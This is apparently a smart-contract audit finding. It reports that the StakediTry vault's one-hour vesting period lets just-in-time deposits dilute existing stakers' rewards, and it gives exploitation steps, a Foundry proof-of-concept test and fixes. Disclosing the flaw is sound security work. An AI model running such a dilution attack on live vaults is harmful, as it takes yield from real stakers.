## Title
Short Vesting Period Enables Reward Dilution Attack Through Just-in-Time Deposits

## Summary
The StakediTry vault initializes with a 1-hour vesting period, allowing attackers to dilute existing stakers' rewards by depositing immediately after reward distributions. Since `totalAssets()` excludes unvested rewards, attackers can purchase shares at pre-reward prices and extract a portion of rewards meant for long-term stakers with minimal capital lockup.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTry.sol` (constructor line 82, `_deposit` function lines 240-252, `totalAssets` function lines 192-194)

**Intended Logic:** The vesting mechanism is designed to linearly distribute rewards over a configurable period, preventing flash-loan style attacks where users could deposit right before rewards and immediately withdraw. The intention is to reward stakers who maintain positions over time.

**Actual Logic:** The 1-hour initial vesting period is too short to provide meaningful protection. An attacker can monitor reward distributions, deposit during the vesting window when `totalAssets()` hasn't yet reflected the full reward amount, and then withdraw after vesting completes—effectively stealing a proportional share of rewards from existing stakers. [1](#0-0) [2](#0-1) 

**Exploitation Path:**
1. **Initial State**: Alice has staked 1000 iTRY and holds 1000 shares in the vault
2. **Reward Distribution**: YieldForwarder calls `transferInRewards(100 iTRY)` which sets `vestingAmount = 100` and `lastDistributionTimestamp = block.timestamp`. At this moment, `getUnvestedAmount() = 100`, so `totalAssets() = 1100 - 100 = 1000 iTRY` [3](#0-2) [4](#0-3) 

3. **Attacker Deposits**: Bob immediately deposits 1000 iTRY. Since `totalAssets() = 1000` and `totalSupply() = 1000`, he receives `1000 * 1000 / 1000 = 1000 shares`. The vault now has 2000 shares and 2100 iTRY balance, with ~100 unvested [5](#0-4) 

4. **Vesting Completes**: After 1 hour, `getUnvestedAmount() = 0`, so `totalAssets() = 2100 iTRY`. Share price is now `2100 / 2000 = 1.05 iTRY per share`. Alice's 1000 shares are worth 1050 iTRY (50 iTRY gain), Bob's 1000 shares are worth 1050 iTRY (50 iTRY gain). **Without Bob's deposit, Alice would have gained 100 iTRY—Bob has stolen 50 iTRY of Alice's rewards**

**Security Property Broken:** While not explicitly stated as an invariant, the protocol's vesting mechanism is designed to protect existing stakers from dilution. The short 1-hour vesting period fails to achieve this protection, allowing just-in-time deposits to extract yield with minimal time commitment.

## Impact Explanation
- **Affected Assets**: wiTRY shares and iTRY rewards distributed to the StakediTry vault
- **Damage Severity**: Existing stakers lose a proportional share of their rewards based on the attacker's deposit size. In the example above, a 50% dilution occurs when an equal-sized deposit happens during vesting. With predictable reward distributions, sophisticated actors could repeatedly exploit this to extract significant value from long-term stakers
- **User Impact**: All existing wiTRY stakers are affected whenever new deposits occur during the vesting window. Long-term stakers receive lower yields than intended, reducing protocol attractiveness and creating an unfair advantage for short-term, opportunistic depositors

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient iTRY capital can execute this attack. No special privileges required
- **Preconditions**: 
  - Vault must have existing stakers with positions
  - Reward distribution must occur (triggering vesting period)
  - Attacker must be able to monitor and respond to `transferInRewards` transactions (via mempool monitoring or predictable reward schedules)
- **Execution Complexity**: Simple single-transaction attack. Can be front-run or back-run against `transferInRewards` calls. Only requires waiting 1 hour for vesting to complete before withdrawing
- **Frequency**: Exploitable on every reward distribution cycle. If rewards are distributed daily/weekly, this creates consistent extraction opportunities

## Recommendation

**Primary Fix: Prevent deposits during active vesting**

Add a check in the `_deposit` function to revert if rewards are currently vesting:

```solidity
// In src/token/wiTRY/StakediTry.sol, function _deposit, line 240:

function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
        revert OperationNotAllowed();
    }
    
    // ADDED: Prevent deposits during vesting to protect existing stakers
    if (getUnvestedAmount() > 0) {
        revert StillVesting();
    }
    
    super._deposit(caller, receiver, assets, shares);
    _checkMinShares();
}
```

**Alternative Mitigation: Set longer initial vesting period**

If preventing deposits during vesting is too restrictive for user experience, the admin should immediately set a longer vesting period (e.g., 7-30 days) after deployment:

```solidity
// In deployment script or initialization transaction:
// Wait for any initial rewards to vest, then:
stakediTry.setVestingPeriod(7 days); // or 30 days
```

This increases the capital lockup cost for attackers, making the attack less economically viable. However, this is a weaker mitigation as sophisticated attackers may still find it profitable depending on reward sizes and market conditions.

**Note on Initial 1-Hour Setting:** The 1-hour initial setting appears intentional based on the MIN_VESTING_PERIOD constant definition. However, this creates a vulnerability window during initial deployment. The contract should either enforce deposit restrictions during vesting or launch with a production-ready vesting period from day one. [6](#0-5) [7](#0-6) 

## Proof of Concept

```solidity
// File: test/Exploit_VestingDilution.t.sol
// Run with: forge test --match-test test_VestingPeriodDilutionAttack -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTry.sol";
import "../test/mocks/MockERC20.sol";

contract Exploit_VestingDilution is Test {
    StakediTry public vault;
    MockERC20 public iTry;
    
    address public admin = makeAddr("admin");
    address public rewarder = makeAddr("rewarder");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    
    function setUp() public {
        // Deploy iTRY token
        iTry = new MockERC20("iTRY", "iTRY");
        
        // Deploy StakediTry vault
        vm.prank(admin);
        vault = new StakediTry(IERC20(address(iTry)), rewarder, admin);
        
        // Grant rewarder role
        vm.prank(admin);
        vault.grantRole(keccak256("REWARDER_ROLE"), rewarder);
        
        // Mint tokens to users
        iTry.mint(alice, 10000e18);
        iTry.mint(bob, 10000e18);
        iTry.mint(rewarder, 10000e18);
        
        // Approve vault
        vm.prank(alice);
        iTry.approve(address(vault), type(uint256).max);
        
        vm.prank(bob);
        iTry.approve(address(vault), type(uint256).max);
        
        vm.prank(rewarder);
        iTry.approve(address(vault), type(uint256).max);
    }
    
    function test_VestingPeriodDilutionAttack() public {
        // SETUP: Alice stakes 1000 iTRY as initial long-term staker
        vm.prank(alice);
        uint256 aliceShares = vault.deposit(1000e18, alice);
        assertEq(aliceShares, 1000e18, "Alice should get 1000 shares");
        
        uint256 aliceInitialBalance = iTry.balanceOf(alice);
        
        // EXPLOIT STEP 1: Rewarder distributes 100 iTRY rewards
        // This starts the vesting period (1 hour by default)
        vm.prank(rewarder);
        vault.transferInRewards(100e18);
        
        // Verify vesting has started
        assertEq(vault.getUnvestedAmount(), 100e18, "100 iTRY should be unvested");
        assertEq(vault.totalAssets(), 1000e18, "totalAssets excludes unvested rewards");
        
        // EXPLOIT STEP 2: Bob deposits 1000 iTRY immediately after reward distribution
        // Bob gets shares at pre-reward price because totalAssets() excludes unvested
        vm.prank(bob);
        uint256 bobShares = vault.deposit(1000e18, bob);
        assertEq(bobShares, 1000e18, "Bob gets 1000 shares at old price");
        
        // Vault now has 2000 shares total
        assertEq(vault.totalSupply(), 2000e18, "Total supply should be 2000 shares");
        
        // EXPLOIT STEP 3: Fast forward 1 hour for vesting to complete
        vm.warp(block.timestamp + 1 hours);
        
        // Now all rewards are vested
        assertEq(vault.getUnvestedAmount(), 0, "All rewards should be vested");
        assertEq(vault.totalAssets(), 2100e18, "totalAssets should now include rewards");
        
        // VERIFY: Check reward distribution
        // Alice and Bob each have 1000 shares (50% each)
        // So they each get 50 iTRY of the 100 iTRY reward
        uint256 aliceAssets = vault.previewRedeem(aliceShares);
        uint256 bobAssets = vault.previewRedeem(bobShares);
        
        assertEq(aliceAssets, 1050e18, "Alice gets 1050 iTRY (50 reward)");
        assertEq(bobAssets, 1050e18, "Bob gets 1050 iTRY (50 reward)");
        
        // CRITICAL: Alice should have received 100 iTRY in rewards since she was
        // the only staker when rewards arrived. But Bob diluted her by depositing
        // during the vesting window, stealing 50 iTRY of her rewards.
        
        // Demonstrate the theft: Bob withdraws
        vm.prank(bob);
        vault.redeem(bobShares, bob, bob);
        
        uint256 bobProfit = iTry.balanceOf(bob) - 9000e18; // He started with 10000 - 1000 deposited
        assertEq(bobProfit, 50e18, "Vulnerability confirmed: Bob extracted 50 iTRY from Alice's rewards");
        
        // Alice withdraws
        vm.prank(alice);
        vault.redeem(aliceShares, alice, alice);
        
        uint256 aliceProfit = iTry.balanceOf(alice) - aliceInitialBalance;
        assertEq(aliceProfit, 50e18, "Alice only got 50 iTRY instead of 100 iTRY");
        
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Alice (long-term staker) profit:", aliceProfit / 1e18, "iTRY");
        console.log("Bob (just-in-time attacker) profit:", bobProfit / 1e18, "iTRY");
        console.log("Bob stole 50 iTRY from Alice by depositing during 1-hour vesting window");
    }
}
```

## Notes

This vulnerability is particularly concerning because:

1. **Initial Deployment Risk**: The 1-hour vesting period at line 82 creates an immediate vulnerability window before the admin can call `setVestingPeriod()` to increase it. Early reward distributions are most susceptible.

2. **Economic Viability**: With just 1 hour of capital lockup, the attack is highly profitable even for relatively small reward distributions. Larger rewards make it even more attractive.

3. **No Deposit Restrictions**: The `_deposit` function has no check for active vesting, allowing deposits at any time. [5](#0-4) 

4. **Predictable Timing**: If reward distributions follow a predictable schedule (e.g., daily/weekly), attackers can front-run or back-run these transactions consistently.

5. **Mempool Visibility**: The `transferInRewards` transaction is visible in the mempool before confirmation, giving sophisticated actors time to prepare and execute the attack in the same block or immediately after.

The recommended fix of preventing deposits during active vesting is the most robust solution, though it trades some user convenience for security. Alternatively, immediately setting a 30-day vesting period post-deployment would significantly increase the attack cost and reduce profitability.

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L33-36)
```text
    /// @notice Minimum allowed vesting period (1 hour)
    uint256 private constant MIN_VESTING_PERIOD = 1 hours;
    /// @notice Maximum allowed vesting period (30 days)
    uint256 private constant MAX_VESTING_PERIOD = 30 days;
```

**File:** src/token/wiTRY/StakediTry.sol (L82-82)
```text
        vestingPeriod = MIN_VESTING_PERIOD;
```

**File:** src/token/wiTRY/StakediTry.sol (L95-107)
```text
    function setVestingPeriod(uint256 _vestingPeriod) external onlyRole(DEFAULT_ADMIN_ROLE) {
        if (_vestingPeriod < MIN_VESTING_PERIOD || _vestingPeriod > MAX_VESTING_PERIOD) {
            revert InvalidVestingPeriod();
        }
        if (getUnvestedAmount() > 0) {
            revert StillVesting();
        }

        uint256 oldVestingPeriod = vestingPeriod;
        vestingPeriod = _vestingPeriod;

        emit VestingPeriodUpdated(oldVestingPeriod, _vestingPeriod);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L113-119)
```text
    function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
        _updateVestingAmount(amount);
        // transfer assets from rewarder to this contract
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

        emit RewardsReceived(amount);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L192-194)
```text
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L199-211)
```text
    function getUnvestedAmount() public view returns (uint256) {
        uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;

        if (timeSinceLastDistribution >= vestingPeriod) {
            return 0;
        }

        uint256 deltaT;
        unchecked {
            deltaT = (vestingPeriod - timeSinceLastDistribution);
        }
        return (deltaT * vestingAmount) / vestingPeriod;
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L240-252)
```text
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
        internal
        override
        nonReentrant
        notZero(assets)
        notZero(shares)
    {
        if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
            revert OperationNotAllowed();
        }
        super._deposit(caller, receiver, assets, shares);
        _checkMinShares();
    }
```
